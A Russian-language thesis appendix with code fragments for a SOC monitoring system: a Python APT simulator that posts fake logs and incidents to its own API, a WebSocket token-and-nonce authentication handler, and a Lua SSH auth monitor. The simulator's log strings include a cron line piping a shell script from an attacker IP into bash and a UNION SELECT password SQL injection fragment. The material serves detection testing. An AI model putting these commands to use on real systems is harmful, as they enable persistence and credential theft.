# Фрагменты программного кода системы мониторинга и защиты Mistral SOC

Этот документ содержит ключевые фрагменты программного кода, используемые в дипломном проекте для реализации симулятора атак, механизмов аутентификации WebSocket и системных мониторов безопасности.

---

## 1. Фрагмент программного кода генерации боевой нагрузки симулятора Mistral Demo
Фрагмент Python-скрипта `attack_simulator.py`, реализующий пошаговую генерацию многовекторной атаки (APT сценарий) с имитацией сканирования портов, SSH брутфорса, SQL-инъекции, повышения привилегий и запуска шифровальщика с отправкой телеметрии и инцидентов на API Mistral Server.

```python
def run_apt_attack(step_by_step=False):
    print_header()
    print_color(f" [ MISTRAL APT ATTACK SIMULATION - {'ПОШАГОВЫЙ РЕЖИМ' if step_by_step else 'ЭКСПРЕСС-РЕЖИМ'} ]", "red")
    print(f" Target: {BASE_URL}")
    print(f" Attacker IP: {ATTACKER_IP}")
    print()

    # PHASE 1: Сбор информации (Reconnaissance)
    print_color("\n=== [ФАЗА 1] СБОР ИНФОРМАЦИИ И СКАНИРОВАНИЕ ПОРТОВ (RECON) ===", "cyan")
    simulate_progress(f"Сканирование сети с IP {ATTACKER_IP}", 2)
    for i in range(1, 4):
        api_request('/api/logs', {
            'type': 'server', 
            'level': 'warn', 
            'message': f'[Firewall] Port scan detected from {ATTACKER_IP} - port check {i}/3'
        })
        time.sleep(0.4)
    api_request('/api/incidents', {
        'severity': 'LOW', 'monitor': 'NetworkMonitor', 'type': 'PORT_SCAN',
        'description': f'Targeted port scan from {ATTACKER_IP}. Nmap SYN Stealth signature detected.'
    })
    
    # PHASE 2: Подбор паролей SSH (Credential Access)
    print_color("\n=== [ФАЗА 2] ПОПЫТКА СКОМПРОМЕТИРОВАТЬ SSH (BRUTE-FORCE) ===", "cyan")
    simulate_progress("Выполнение Hydra SSH Brute-Force", 3)
    for i in range(1, 6):
        api_request('/api/logs', {
            'type': 'server', 
            'level': 'warn', 
            'message': f'[SSH] Failed password for root from {ATTACKER_IP} port 4833{i} ssh2'
        })
        time.sleep(0.3)
    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f'[SSH] Successful login for root from {ATTACKER_IP}'})
    api_request('/api/incidents', {
        'severity': 'HIGH', 'monitor': 'AuthMonitor', 'type': 'SSH_BRUTE_FORCE_SUCCESS',
        'description': f'Multiple failed SSH logins followed by a successful root session from {ATTACKER_IP}.'
    })

    # PHASE 3: Внедрение SQL-кода (Exploitation)
    print_color("\n=== [ФАЗА 3] СКАНИРОВАНИЕ И ЭКСПЛУАТАЦИЯ WEB-УЯЗВИМОСТИ (SQLi) ===", "cyan")
    simulate_progress("Обход WAF правил и внедрение SQL-полезной нагрузки", 3)
    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[WAF] Warning: Suspicious query payload from {ATTACKER_IP} matching rule SQLI_AUTH"})
    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': "[DB] SQL Syntax error near 'UNION SELECT NULL, password FROM users--'"})
    api_request('/api/incidents', {
        'severity': 'HIGH', 'monitor': 'WafMonitor', 'type': 'SQL_INJECTION',
        'description': f'Attacker {ATTACKER_IP} bypassed WAF rules and successfully executed SQL injection on /api/auth endpoint.'
    })

    # PHASE 4: Повышение привилегий (Privilege Escalation)
    print_color("\n=== [ФАЗА 4] ПОВЫШЕНИЕ ПРИВИЛЕГИЙ И ЗАКРЕПЛЕНИЕ (PRIVILEGE ESCALATION) ===", "cyan")
    simulate_progress("Загрузка и компиляция эксплоита DirtyPipe", 3)
    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[Audit] Unauthorized modification of /etc/shadow by UID=1002 from {ATTACKER_IP}"})
    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[Cron] New cron entry: '* * * * * curl http://{ATTACKER_IP}/shell | bash'"})
    api_request('/api/incidents', {
        'severity': 'CRITICAL', 'monitor': 'IntegrityMonitor', 'type': 'PRIVILEGE_ESCALATION',
        'description': f'Kernel exploit executed from IP {ATTACKER_IP}. /etc/shadow modified. Malicious persistent cron job added.'
    })

    # PHASE 5: Шифрование данных (Impact / Ransomware)
    print_color("\n=== [ФАЗА 5] НАНЕСЕНИЕ УЩЕРБА И ШИФРОВАНИЕ ДАННЫХ (RANSOMWARE) ===", "cyan")
    send_metric_spike(100, 96, 99) # имитация критической загрузки CPU
    simulate_progress("Массовое шифрование файлов в /var/www", 4)
    for i in range(1, 6):
        api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f'[Filemon] Mass encryption: /var/www/site_data_{i}.enc by attacker {ATTACKER_IP}'})
        time.sleep(0.3)
    
    api_request('/api/incidents', {
        'severity': 'CRITICAL', 'monitor': 'SystemMonitor', 'type': 'RANSOMWARE_ENCRYPTION',
        'description': f'Massive file encryption in progress. Spiked CPU resources. IP: {ATTACKER_IP}. Ransom note dropped.'
    })
```

---

## 2. Фрагмент программного кода валидации токена при установке WSS-соединения
Фрагмент кода из Node.js сервера `server.js` (модуль `startWSS`), реализующий аутентификацию входящих WebSocket соединений с защитой от атак повторного воспроизведения (Replay Attack) через одноразовые числа (nonces) и проверку секретного токена авторизации.

```javascript
function startWSS(server) {
  const wss = new WebSocket.Server({ server, path: "/ws" });
  wss.on("connection", (ws, req) => {
    const clientId = uuidv4();
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Инициализация неавторизованного клиента в сессии
    clients.set(ws, { id: clientId, ip, authenticated: false });
    addLog("server", "info", "WS client connected (awaiting auth)", { clientId, ip });

    // Тайм-аут на прохождение аутентификации (10 секунд)
    const authTimer = setTimeout(() => {
      if (!clients.get(ws)?.authenticated) { 
        ws.close(4001, "Auth timeout"); 
      }
    }, 10000);

    ws.on("message", async (raw) => {
      try {
        const msg = JSON.parse(raw.toString());
        const client = clients.get(ws);

        // Обработка запроса аутентификации
        if (msg.event === "auth") {
          const { token, nonce, username } = msg.data || {};
          
          if (!token || !nonce) { 
            ws.send(JSON.stringify({ event: "auth_error", data: { error: "Missing token or nonce" } })); 
            return; 
          }
          
          // Защита от Replay-атаки: проверка уникальности nonce
          if (usedNonces.has(nonce)) { 
            ws.close(4002, "Replay detected"); 
            return; 
          }
          
          // Валидация криптографического токена доступа
          if (token === WSS_SECRET_TOKEN) {
            usedNonces.add(nonce);
            client.authenticated = true;
            client.username = username || "admin";
            client.connectedAt = new Date().toISOString();
            clearTimeout(authTimer);
            
            // Отправка подтверждения успешного входа
            ws.send(JSON.stringify({ 
              event: "auth_success", 
              data: { clientId, model: activeModel, clientIp: ip, username: client.username, connectedAt: client.connectedAt } 
            }));
            
            addLog("server", "info", `WS client authenticated: ${client.username}`, { clientId, ip });
            
            // Синхронизация текущего состояния системы с клиентом (инциденты, логи, карантин)
            ws.send(JSON.stringify({ event: "active_connections", data: getActiveConnectionsList() }));
            broadcast({ event: "active_connections", data: getActiveConnectionsList() });
            ws.send(JSON.stringify({ event: "stats", data: { ...db.getStats(), connectedClients: clients.size } }));
            ws.send(JSON.stringify({ event: "incidents_list", data: incidents.slice(0, 100) }));
            ws.send(JSON.stringify({ event: "logs_list", data: serverLogs.slice(0, 200) }));
            ws.send(JSON.stringify({ event: "quarantine_updated", data: db.getQuarantinedIps() }));
            ws.send(JSON.stringify({ event: "soar_settings_updated", data: soarSettings }));
          } else {
            ws.send(JSON.stringify({ event: "auth_error", data: { error: "Invalid token" } }));
          }
        }
      } catch (err) {
        logger.error('WS auth/message processing error', err);
      }
    });
  });
}
```

---

## 3. Фрагмент Lua-скрипта мониторинга системного журнала аутентификации (`monitor_auth.lua`)
Скрипт собирает информацию о текущих сессиях терминалов (`who`), действиях `sudo` из `journalctl`, неудавшихся попытках входа по SSH и контролирует целостность файла `authorized_keys`. При обнаружении аномалий отправляет алерты и регистрирует инциденты информационной безопасности.

```lua
-- Функция сбора неудачных попыток входа из журнала systemd-journald
function get_failed_logins()
    local out = read_cmd("journalctl _COMM=sshd --since '10 minutes ago' -q --no-pager 2>/dev/null")
    local failed = {}
    for line in out:gmatch("[^\n]+") do
        if line:find("Failed password") or line:find("Invalid user") then
            local ip = line:match("from%s+(%S+)") or "127.0.0.1"
            table.insert(failed, {ip = ip, line = line:sub(-120)})
        end
    end
    return failed
end

-- Функция проверки целостностиauthorized_keys для предотвращения несанкционированного закрепления в ОС
function get_ssh_keys_info()
    local f = io.open(os.getenv("HOME") .. "/.ssh/authorized_keys", "r")
    if not f then return nil end
    local data = f:read("*a")
    f:close()
    return {size = #data, lines = select(2, data:gsub("\n", "\n"))}
end

-- Модуль выявления аномалий информационной безопасности
function check_anomalies(data, prev_keys)
    local anomalies = {}
    
    -- 1. Выявление активных сессий суперпользователя (root)
    local root_sessions = {}
    for _, s in ipairs(data.ssh_sessions) do
        if s.user == "root" then table.insert(root_sessions, s) end
    end
    if #root_sessions > 0 then
        local ips = {}
        for _, s in ipairs(root_sessions) do table.insert(ips, s.ip) end
        table.insert(anomalies, {
            severity = "CRITICAL",
            type = "ROOT_SSH",
            description = "ROOT sessions active: " .. #root_sessions .. " (IP: " .. table.concat(ips, ", ") .. ")"
        })
    end

    -- 2. Обнаружение брутфорса (превышение лимита неудачных авторизаций)
    if #data.failed_logins > MAX_FAILED then
        local ip_counts = {}
        for _, f in ipairs(data.failed_logins) do
            ip_counts[f.ip] = (ip_counts[f.ip] or 0) + 1
        end
        local top_ip, top_count = nil, 0
        for ip, c in pairs(ip_counts) do
            if c > top_count then top_ip, top_count = ip, c end
        end
        table.insert(anomalies, {
            severity = "HIGH",
            type = "FAILED_LOGINS",
            description = "Неудачных входов: " .. #data.failed_logins .. " (лидер IP " .. (top_ip or "?") .. ": " .. top_count .. ")"
        })
    end

    -- 3. Детектирование несанкционированного изменения авторизованных ключей
    if prev_keys and data.keys_info then
        if prev_keys.size ~= data.keys_info.size then
            table.insert(anomalies, {
                severity = "CRITICAL",
                type = "AUTH_KEYS_CHANGED",
                description = "authorized_keys изменён! Прежний размер: " .. prev_keys.size .. ", новый: " .. data.keys_info.size
            })
        end
    end

    return anomalies
end
```
